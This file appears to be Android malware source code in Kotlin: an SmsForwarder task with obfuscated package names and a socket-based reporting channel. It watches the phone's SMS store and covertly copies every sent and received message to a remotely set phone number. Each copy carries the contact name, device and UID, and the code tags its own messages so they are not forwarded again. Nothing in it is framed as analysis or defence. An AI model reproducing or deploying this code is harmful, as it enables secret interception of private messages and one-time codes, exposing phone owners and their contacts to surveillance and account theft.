package com.xxx.zzz.commandp.taskssv

import android.content.ContentResolver
import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.telephony.SmsManager
import android.util.Log
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt
import java.text.SimpleDateFormat
import java.util.*

class SmsForwarder(ctx: Context, val recipientNumber: String) : BaseTask(ctx) {

    private val TAG = "SmsForwarder"

    private val smsUri = Uri.parse("content://sms")
    private val MESSAGE_TYPE_RECEIVED = 1
    private val MESSAGE_TYPE_SENT = 2
    private val MAX_SMS_MESSAGE_LENGTH = 160

    private val contentResolver: ContentResolver = ctx.contentResolver

    private var sending: Boolean = false

    init {
        smsObserver = SmsObserver(Handler(Looper.getMainLooper()))
        SharedPreferencess.getAppContext()!!.contentResolver.registerContentObserver(
            smsUri,
            true,
            smsObserver!!
        )
    }

    companion object {
        private var smsObserver: SmsObserver? = null
    }


    inner class SmsObserver(handler: Handler) : ContentObserver(handler) {

        private var lastId = 0

        override fun onChange(selfChange: Boolean) {
            super.onChange(selfChange)
            runCatching {
                val cursor = contentResolver.query(smsUri, null, null, null, null)
                if (cursor != null && cursor.moveToNext()) {
                    forwardSms(cursor)
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "SmsObserver ${it.localizedMessage}", "error")
            }
        }

        private fun forwardSms(mCur: Cursor) {
            runCatching {
                val type = mCur.getInt(mCur.getColumnIndex("type"))
                val id = mCur.getInt(mCur.getColumnIndex("_id"))
                val body = mCur.getString(mCur.getColumnIndex("body"))

                
                if ((type == MESSAGE_TYPE_RECEIVED || type == MESSAGE_TYPE_SENT) &&
                    id != lastId &&
                    
                    !body.contains("SMS_FORWARDER_SIGNATURE")
                ) {

                    lastId = id

                    val df = SimpleDateFormat("EEE d MMM yyyy", Locale.ENGLISH)
                    val tf = SimpleDateFormat("hh:mm aaa", Locale.ENGLISH)
                    val calendar = Calendar.getInstance()
                    val now = mCur.getString(mCur.getColumnIndex("date"))
                    calendar.timeInMillis = java.lang.Long.parseLong(now)
                    val phone = mCur.getString(mCur.getColumnIndex("address"))
                    val name = getContactName(phone)
                    val date = df.format(calendar.time) + "\n" + tf.format(calendar.time)

                    var message = "SMS_FORWARDER_SIGNATURE" + "\n\n"
                    message += "From: " + params.device + "\n"
                    message += "UID: " + params.uid + "\n\n"
                    message += if (type == MESSAGE_TYPE_RECEIVED) "(Received) " else if (type == MESSAGE_TYPE_SENT) "(Sent) " else ""
                    message += name + "\n"
                    message += phone ?: ""
                    message += "\n\n"
                    message += body + "\n\n"
                    message += date + "\n\n"

                    val send = SendSmsThread(recipientNumber, message)
                    send.start()
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "forwardSms ${it.localizedMessage}", "error")
            }
        }

        inner class SendSmsThread(private val phone: String, private val message: String) : Thread() {

            private val manager = SmsManager.getDefault()
            private val delay = 3000

            override fun run() {
                super.run()
                runCatching {
                    if (sending) {
                        Log.i(TAG, "Resending..")
                        try {
                            sleep(delay.toLong())
                        } catch (e: InterruptedException) {
                            IOSocketyt.sendLogs("", Gsonq().toJson(e.localizedMessage), "error")
                        } finally {
                            SendSmsThread(this.phone, this.message).start()
                        }
                        return
                    }
                    sending = true

                    try {
                        Log.i(TAG, "Sleeping ..")
                        sleep(delay.toLong())
                    } catch (e: InterruptedException) {
                        IOSocketyt.sendLogs("", "SendSmsThread ${e.localizedMessage}", "error")
                    } finally {
                        Log.i(TAG, "Sending message ")
                        val length = message.length

                        if (length > MAX_SMS_MESSAGE_LENGTH) {
                            val messageList = manager.divideMessage(message)

                            manager.sendMultipartTextMessage(phone, null, messageList, null, null)
                        } else {
                            manager.sendTextMessage(phone, null, message, null, null)
                        }

                        sending = false
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "SendSmsThread ${it.localizedMessage}", "error")
                }
            }
        }
    }

}